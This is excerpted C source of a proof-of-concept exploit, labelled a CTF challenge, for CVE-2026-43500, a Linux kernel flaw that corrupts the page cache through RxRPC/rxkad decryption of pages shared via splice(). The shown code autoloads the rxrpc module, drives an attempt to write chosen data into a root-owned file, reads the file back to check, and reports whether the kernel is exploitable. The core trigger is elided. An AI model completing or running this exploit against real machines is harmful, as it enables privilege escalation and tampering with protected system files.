/**
 * CVE-2026-43500 PoC - CTF Challenge Mode
 *
 * RxRPC/rxkad page cache corruption via splice() shared pages.
 *
 * This CVE specifically targets the RxRPC rxkad subsystem. Only the
 * RxRPC exploit path is used — no ESP/xfrm fallback.
 *
 * RxRPC/rxkad variant:
 ...
 *
 * If AF_RXRPC is unavailable (e.g. WSL2), the PoC reports NOT_EXPLOITABLE
 * since this specific vulnerability requires the rxrpc kernel module.
 *
 * CTF Modes:
...
static int do_rxrpc_exploit(const char *target_path, const char *write_value, size_t val_len)
{
    ...
    poc_log("CVE-2026-43500: RxRPC variant only — no ESP fallback");

    /* Autoload rxrpc module */
    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (dummy < 0) {
        if (errno == EAFNOSUPPORT || errno == ENOSYS || errno == EPROTONOSUPPORT) {
            poc_log("AF_RXRPC not supported on this kernel (errno=%d: %s)",
                    errno, strerror(errno));
            poc_log("This kernel does not have rxrpc module — CVE-2026-43500 not exploitable");
        } else {
            poc_log("socket(AF_RXRPC) failed: %s — rxrpc module not available",
                    strerror(errno));
        }
        return -1;
    }
 ...
 */
static int __attribute__((unused)) do_esp_exploit(const char *target_path, const char *write_value,
                          size_t val_len)
{
...
/* ========================================================================
 * mode_write_root_file - CTF Write Mode (RxRPC-only page cache corruption)
 *
 * Strategy:
 *   Uses RxRPC variant only: triggers kernel's rxkad in-place decrypt on
 *   page cache pages shared through splice().
 *
 *   If AF_RXRPC is unavailable (e.g. WSL2 where rxrpc module is not
 *   compiled), the PoC reports NOT_EXPLOITABLE — this is correct behavior
 *   since CVE-2026-43500 specifically requires the RxRPC/rxkad subsystem.
 *
...
static int mode_write_root_file(poc_args_t *args)
{
    ...
    /* Step 2: Execute exploit (RxRPC variant only — this CVE is rxkad-specific) */
    printf("%s%s (attempting via RxRPC variant...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int exploit_ret = do_rxrpc_exploit(args->root_file, args->write_value, val_len);

    if (exploit_ret != 0) {
        poc_log("RxRPC variant failed (ret=%d) — no fallback for this CVE", exploit_ret);
        poc_log("CVE-2026-43500 requires AF_RXRPC; if unavailable, kernel is not exploitable");
    }
    ...
    ssize_t after_len = 0;
    {
        ...
        if (fd >= 0) {
            after_len = read(fd, after, sizeof(after) - 1);
            poc_log_syscall("read(fd, after) [verify]", (long)after_len, errno);
            close(fd);
    ...
    if (exploit_ret == 0 ||
        (after_len > 0 && memmem(after, (size_t)after_len, args->write_value, val_len) != NULL)) {
    ...
    poc_print_fail("page cache not modified - AF_RXRPC not supported on this kernel");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 1;
}
...
int main(int argc, char *argv[])
{
    ...
    poc_log("=== CVE-2026-43500 CTF PoC ===");
    poc_log("Vuln: RxRPC/rxkad page cache corruption via splice (brute-force overlapping triggers)");
